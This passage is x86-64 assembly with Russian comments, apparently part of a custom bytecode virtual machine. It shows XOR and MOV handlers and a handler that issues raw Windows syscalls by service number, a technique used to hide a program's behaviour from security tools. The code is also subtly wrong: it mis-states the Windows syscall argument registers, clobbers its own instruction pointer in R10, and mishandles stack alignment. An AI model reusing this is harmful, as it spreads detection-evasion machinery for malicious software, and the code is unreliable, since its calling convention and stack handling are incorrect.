    movzx   ecx, byte [r10]
    inc     r10

    ; Определяем исходный регистр (reg_src)
    mov     rbx, rcx
    and     bl, 0x0F
    ; Загружаем значение из исходного регистра в RAX
    cmp     bl, 0
    je      xor_load_r14
    cmp     bl, 1
    je      xor_load_r13
    cmp     bl, 2
    je      xor_load_r12
    cmp     bl, 3
    je      xor_load_r11
    jmp     vm_loop
xor_load_r14: mov rax, r14; jmp xor_reg_reg_op
xor_load_r13: mov rax, r13; jmp xor_reg_reg_op
xor_load_r12: mov rax, r12; jmp xor_reg_reg_op
xor_load_r11: mov rax, r11; jmp xor_reg_reg_op

xor_reg_reg_op:
    ; Определяем регистр назначения (reg_dst) и выполняем XOR
    mov     rbx, rcx
    shr     bl, 4
    and     bl, 0x0F
    cmp     bl, 0
    je      xor_store_r14
    cmp     bl, 1
    je      xor_store_r13
    cmp     bl, 2
    je      xor_store_r12
    cmp     bl, 3
    je      xor_store_r11
    jmp     vm_loop
xor_store_r14: xor r14, rax; jmp vm_loop
xor_store_r13: xor r13, rax; jmp vm_loop
xor_store_r12: xor r12, rax; jmp vm_loop
xor_store_r11: xor r11, rax; jmp vm_loop

handle_mov_reg_mem_stack: ; MOV reg_src, [stack_pop]
    ; Читаем регистр-источник (reg_src)
    movzx   ebx, byte [r10]   ; Номер регистра VM (0-3)
    inc     r10               ; VM_IP++
    
    ; Извлекаем адрес назначения со стека VM
    pop     rdi               ; Адрес назначения в RDI
    mov     r15, rsp          ; Обновляем VM_SP
    
    ; Загружаем значение из регистра-источника в RAX
    cmp     bl, 0
    je      mov_load_r14_stackw
    cmp     bl, 1
    je      mov_load_r13_stackw
    cmp     bl, 2
    je      mov_load_r12_stackw
    cmp     bl, 3
    je      mov_load_r11_stackw
    jmp     vm_loop ; Неизвестный исходный регистр
mov_load_r14_stackw: mov rax, r14; jmp mov_reg_mem_stack_write
mov_load_r13_stackw: mov rax, r13; jmp mov_reg_mem_stack_write
mov_load_r12_stackw: mov rax, r12; jmp mov_reg_mem_stack_write
mov_load_r11_stackw: mov rax, r11; jmp mov_reg_mem_stack_write

mov_reg_mem_stack_write:
    ; Записываем значение из RAX в память по адресу в RDI
    mov     qword [rdi], rax
    jmp     vm_loop

handle_mov_mem_stack_reg: ; MOV reg_dst, [stack_pop]
    ; Читаем регистр-назначение (reg_dst)
    movzx   ebx, byte [r10]   ; Номер регистра VM (0-3)
    inc     r10               ; VM_IP++
    
    ; Извлекаем адрес источника со стека VM
    pop     rdi               ; Адрес источника в RDI
    mov     r15, rsp          ; Обновляем VM_SP
    
    ; Читаем значение из памяти по адресу в RDI в RAX
    mov     rax, qword [rdi]
    
    ; Сохраняем значение из RAX в регистр-назначение
    cmp     bl, 0
    je      mov_store_r14_stackr
    cmp     bl, 1
    je      mov_store_r13_stackr
    cmp     bl, 2
    je      mov_store_r12_stackr
    cmp     bl, 3
    je      mov_store_r11_stackr
    jmp     vm_loop ; Неизвестный регистр назначения
mov_store_r14_stackr: mov r14, rax; jmp vm_loop
mov_store_r13_stackr: mov r13, rax; jmp vm_loop
mov_store_r12_stackr: mov r12, rax; jmp vm_loop
mov_store_r11_stackr: mov r11, rax; jmp vm_loop

handle_syscall:
    ; Читаем номер системного вызова (SSN) - 4 байта
    mov     eax, dword [r10]  ; SSN в EAX
    add     r10, 4            ; VM_IP += 4
    ; Читаем количество аргументов - 1 байт
    movzx   rbx, byte [r10]   ; Количество аргументов в RBX
    inc     r10               ; VM_IP += 1

    ; Сохраняем регистры VM и пользовательские регистры перед вызовом
    push    r10 ; VM_IP
    push    r11 ; VM_R3
    push    r12 ; VM_R2
    push    r13 ; VM_R1
    push    r14 ; VM_R0 
    push    r15 ; VM_SP
    ; Сохраняем регистры, которые могут быть изменены syscall, но используются нами
    push    rbx ; Сохраняем количество аргументов

    ; Подготовка аргументов для syscall (x64 Windows ABI)
    ; Первые 6 аргументов: RCX, RDX, R8, R9, R10 (5й!), stack
    ; Аргументы снимаем с нашего стека VM (r15)
    
    ; Сначала подготовим R10 (5-й аргумент), если он есть
    cmp     bl, 4
    jle     prep_arg4
    mov     r10, qword [r15 + 8*4] ; Берем 5-й аргумент (индекс 4) со стека VM
prep_arg4:
    cmp     bl, 3
    jle     prep_arg3
    mov     r9, qword [r15 + 8*3] ; 4-й аргумент в R9
prep_arg3:
    cmp     bl, 2
    jle     prep_arg2
    mov     r8, qword [r15 + 8*2] ; 3-й аргумент в R8
prep_arg2:
    cmp     bl, 1
    jle     prep_arg1
    mov     rdx, qword [r15 + 8*1] ; 2-й аргумент в RDX
prep_arg1:
    cmp     bl, 0
    jle     prep_args_done
    mov     rcx, qword [r15 + 8*0] ; 1-й аргумент в RCX
prep_args_done:

    ; TODO: Обработка аргументов > 5 (копирование со стека VM на реальный стек)
    ; Пока не реализовано. Для большинства нужных нам syscall 6 аргументов достаточно.

    ; Выполняем системный вызов
    ; Выравниваем стек до 16 байт перед syscall
    push    rsp     ; Сохраняем текущий RSP
    push    qword [rsp] ; Делаем копию, чтобы получить адрес для выравнивания
    and     rsp, 0xFFFFFFFFFFFFFFF0 ; Выравниваем RSP
    ; Теперь RSP выровнен

    syscall                   ; SSN уже в RAX
    
    ; Восстанавливаем оригинальный RSP
    mov     rsp, qword [rsp+8] ; Восстанавливаем из копии, которую сохранили

    ; Восстанавливаем регистры VM и пользовательские регистры
    pop     rbx ; Восстанавливаем количество аргументов (уже не нужно)
    pop     r15 ; VM_SP (стек VM не менялся)
    pop     r14 ; VM_R0 (теперь тут результат syscall из RAX)
    mov     r14, rax          ; Сохраняем результат в r14
    pop     r13 ; VM_R1
    pop     r12 ; VM_R2
    pop     r11 ; VM_R3
    pop     r10 ; VM_IP

    ; Очищаем стек VM от аргументов, которые были переданы в syscall
    ; Перемещаем VM_SP (r15)
    ; TODO: Правильно очистить стек VM, если r15 != rsp
    ; Если r15 == rsp, то реальный стек уже испорчен syscall (нужно восстановить?)
    ; Пока предполагаем r15 == rsp, и аргументы просто "сгорают" со стека VM
    ; так как реальный стек используется для аргументов > 4 и возврата.
    ; Нужно ли нам сохранять/восстанавливать r15?
    ; Если мы хотим сохранить стек VM, его нужно было бы скопировать ДО вызова syscall.
    ; Пока что просто увеличим r15 на размер снятых аргументов
    lea     r15, [r15 + rbx*8] ; Передвигаем указатель стека VM

    jmp     vm_loop